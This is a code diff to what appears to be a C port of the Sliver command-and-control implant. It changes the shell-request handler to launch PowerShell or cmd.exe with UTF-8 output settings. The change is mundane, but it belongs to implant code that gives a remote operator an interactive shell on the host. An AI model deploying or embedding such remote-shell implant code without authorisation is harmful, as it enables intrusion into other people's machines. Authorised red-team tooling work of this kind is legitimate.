@@ -12,6 +12,14 @@
 #include <stdlib.h>
 #include <string.h>
 
+#if defined(_WIN32)
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
+#endif
+
+#include "sliver/fs.h"
 #include "sliver/log.h"
 #include "sliver/platform.h"
 #include "sliver/proc.h"
@@ -121,6 +129,56 @@ static uint64_t next_tunnel_id(void) {
   return ((uint64_t)sliver_now_ms() << 16) ^ (uint64_t)(sliver_current_pid() & 0xffff) ^ counter;
 }
 
+/* Picks the shell the way the Go implant does: PowerShell configured for UTF-8
+ * when available, otherwise cmd.exe switched to code page 65001 so Chinese (and
+ * any other non-ASCII) output does not arrive as OEM bytes. */
+static size_t build_shell_argv(const char *requested, const char *argv[4], char *path_buf,
+                               size_t cap) {
+#if defined(_WIN32)
+  char candidate[512];
+  DWORD n = GetEnvironmentVariableA("SystemRoot", candidate, (DWORD)sizeof(candidate));
+  static char ps_path[512];
+  static char cmd_path[512];
+  size_t argc = 0;
+
+  if (requested != NULL && requested[0] != '\0') {
+    (void)snprintf(path_buf, cap, "%s", requested);
+    if (_stricmp(requested, "cmd.exe") == 0 || _stricmp(requested, "cmd") == 0) {
+      argv[argc++] = "/K";
+      argv[argc++] = "chcp 65001>nul";
+    }
+    return argc;
+  }
+  if (n > 0 && n < sizeof(candidate)) {
+    (void)snprintf(ps_path, sizeof(ps_path),
+                   "%s\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", candidate);
+    (void)snprintf(cmd_path, sizeof(cmd_path), "%s\\System32\\cmd.exe", candidate);
+    if (sliver_fs_exists(ps_path)) {
+      (void)snprintf(path_buf, cap, "%s", ps_path);
+      argv[argc++] = "-NoExit";
+      argv[argc++] = "-Command";
+      argv[argc++] = "[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8";
+      return argc;
+    }
+    if (sliver_fs_exists(cmd_path)) {
+      (void)snprintf(path_buf, cap, "%s", cmd_path);
+      argv[argc++] = "/K";
+      argv[argc++] = "chcp 65001>nul";
+      return argc;
+    }
+  }
+  (void)snprintf(path_buf, cap, "%s", "cmd.exe");
+  argv[argc++] = "/K";
+  argv[argc++] = "chcp 65001>nul";
+  return argc;
+#else
+  (void)requested;
+  (void)argv;
+  (void)snprintf(path_buf, cap, "%s", "/bin/sh");
+  return 0;
+#endif
+}
+
 int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out) {
   sliver_shell_req_t sr;
   sliver_child_t *child = NULL;
@@ -128,26 +186,19 @@ int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out) {
   shell_reader_arg_t *arg;
   uint32_t pid = 0;
   uint64_t id;
-  const char *argv[1];
+  const char *argv[4];
+  char shell_path[512];
+  size_t argc;
   char err[256];
 
   if (sliver_shell_req_decode(req->data, req->data_len, &sr) != 0) {
     return -1;
   }
-  if (sr.path[0] == '\0') {
-    (void)snprintf(sr.path, sizeof(sr.path), "%s",
-#if defined(_WIN32)
-                   "cmd.exe"
-#else
-                   "/bin/sh"
-#endif
-    );
-  }
-  argv[0] = NULL;
+  argc = build_shell_argv(sr.path, argv, shell_path, sizeof(shell_path));
   err[0] = '\0';
-  if (sliver_child_spawn(sr.path, argv, 0, &child, &pid) != 0) {
-    (void)snprintf(err, sizeof(err), "shell %s: cannot start", sr.path);
-    return sliver_shell_encode(out, sr.path, 0, 0, 0, err);
+  if (sliver_child_spawn(shell_path, argv, argc, &child, &pid) != 0) {
+    (void)snprintf(err, sizeof(err), "shell %s: cannot start", shell_path);
+    return sliver_shell_encode(out, shell_path, 0, 0, 0, err);
   }
   id = next_tunnel_id();
   /* The client allocates the tunnel id and sends it in ShellReq (field 8); we
@@ -210,4 +261,5 @@ int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *o
   (void)out;
   return -2; /* piped shells have no window size */
 }
+
 
